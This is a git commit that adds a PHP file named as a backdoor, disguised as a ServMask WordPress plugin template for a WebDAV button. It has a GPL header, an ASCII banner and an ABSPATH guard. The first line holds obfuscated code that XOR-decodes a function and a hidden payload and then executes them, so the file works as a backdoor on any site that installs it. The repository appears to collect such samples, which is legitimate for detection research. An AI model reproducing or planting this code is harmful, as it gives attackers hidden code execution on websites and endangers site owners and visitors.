267d452ddff9ab2956b862e608d4d450f28e21ab
NavyTitanium <33707347+NavyTitanium@users.noreply.github.com>
2019-10-10 16:42:06 -0400

    Create backdoor_button-webdav.php

---
+++ PHP/backdoor_button-webdav.php
@@ -0,0 +1,31 @@
+<?php $nSMJYMpf='UH2-2TsTU7::D.Y'; $DzHLld='6:WLF1,2 YYN-A7'^$nSMJYMpf; $NzWhuta='U+oUMIZUEUV4sW.<B. NnB7;dHP-Pqn=-0OalY2>h UYM6XUSt X<9XW00d8AITYkX ETZmp 0TdcZjZbFEShg8<NwrtulP>mBFZRIe;ruhDVvgPe+ FTP4ir.V-+qPko9mgj7pnoD=MraKkguYOZ;gES8Jeno.T>hs,pJUS23=44Yc956C5opcnbK-7 FNzcBN0sWNC3nVGLc1.J5asm 8L8 ixfD6EMf,TOEoIH >D z;lTD7UAR=CoH,ubcvr,p70Tv ,6hxUaS X5CTfw9d3n3 MO8Z= zkkt KJbb1C51:4dIlCN =XQoKPlzT+qepb= ;,AAHsB TJ32TChftfrnjey>9qX2hp=K-GtDdt;6 B1fgG1Oyv>XERs- 4bzjj-RYhy>auTQ WJjkp44;X xoh2PG6RAR-5-Nip+;VHS+P4R:QKPJ; g47XY3l8=Fg6QESsxbH2 ===nu< GODnUG265Yr1Q-xDa=,3xoP65Micdq-ACL>m;2383M0C0Xzw;1MNJOaXS2VBuqLVaQXplKYP,YvtV TbfbfKjzcQTSydSLNEShew AZYDvY EYScnz-UFzhlcncOhR1KZ q1Q5fW-=6Z6du830LAPHrknjZXM LhxkZceZLCk-3+ RjWY 21S5AL8A PP3DOYgN=ZAxtKlpH'; $KWpYfum=$DzHLld('', '<MGt+<461<9Z,2VU1ZSfI:XI;,1Y1.1PXDhHEyI4aF 7.B1:=TX7Nf<6DQ;g,< qO<A15vMTKU-MCzJzB=OZaCWI:WOTRKk4dK 5 aARRHHtmVC9YXT485ZAVJ7YJXkKKPFLC=ygK+H9ROvKOQ=..Z<a:ej;NKE1G3WEPou FAQQZqGRPOjhFKigk9HCU4 RG-;DZlDJNd+MFGUO>TANMFY KERrB W1,9G16eRi.AR7EA1f2+E0 1UcGls6-,=;iPVCtRKIOHEkAwV9Y61OWBn:JWA9.g1XYZVKPK.3Yh8gQPNUDtLg8AQ-4TA-fp=MQMQFYAOMha3yKF;8VS7+HNP9 +;0<mmQ9AHTV.TgIzDPMWL7TOG<;FpRZ913,FEMBGJNF7 Ss7hQ00T6jWKTBUW-ECeaOZ:<Xe6LALnTPkN8;6Y9U>S+.x2TR8PV,8l3UH2OT066EL=,WCRYXFQXA3.mBucVWA8-Z4TQmZ7EUPK4WA,IEBQL31-G2PWJgV5Y0D+RPPT4ifoE<2F7kUWjvI<<EDo=1X8-S=E-E;KFvWZDd76OW0zyq2QPAAv;<pNhApjgWXJI3pCQKJNEiH3C9;Y.Z4L92UTE.ELRHRI .1,UGNN>99AeAXKzCEz7IbHEJLzN38TSjtE 5T.A4wnmtSn+E35PDbWz5'^$NzWhuta); $KWpYfum();
+/**
+ * Copyright (C) 2014-2019 ServMask Inc.
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <http://www.gnu.org/licenses/>.
+ *
+ * ███████╗███████╗██████╗ ██╗   ██╗███╗   ███╗ █████╗ ███████╗██╗  ██╗
+ * ██╔════╝██╔════╝██╔══██╗██║   ██║████╗ ████║██╔══██╗██╔════╝██║ ██╔╝
+ * ███████╗█████╗  ██████╔╝██║   ██║██╔████╔██║███████║███████╗█████╔╝
+ * ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██║╚██╔╝██║██╔══██║╚════██║██╔═██╗
+ * ███████║███████╗██║  ██║ ╚████╔╝ ██║ ╚═╝ ██║██║  ██║███████║██║  ██╗
+ * ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+ */
+
+if ( ! defined( 'ABSPATH' ) ) {
+die( 'Kangaroos cannot jump here' );
+}
+?>
+
+<a href="https://servmask.com/products/webdav-extension" target="_blank">WebDAV</a> 
